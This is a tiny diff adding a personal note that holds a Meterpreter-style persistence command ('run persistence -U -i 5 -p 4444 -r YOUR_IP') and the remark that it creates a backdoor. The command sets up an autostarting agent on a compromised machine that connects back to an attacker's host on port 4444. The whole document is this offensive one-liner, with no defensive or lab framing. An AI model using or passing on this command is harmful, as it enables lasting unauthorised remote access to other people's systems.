@@ -1,0 +1,3 @@
+run persistence -U -i 5 -p 4444 -r YOUR_IP
+
+this creates some form of backdoor
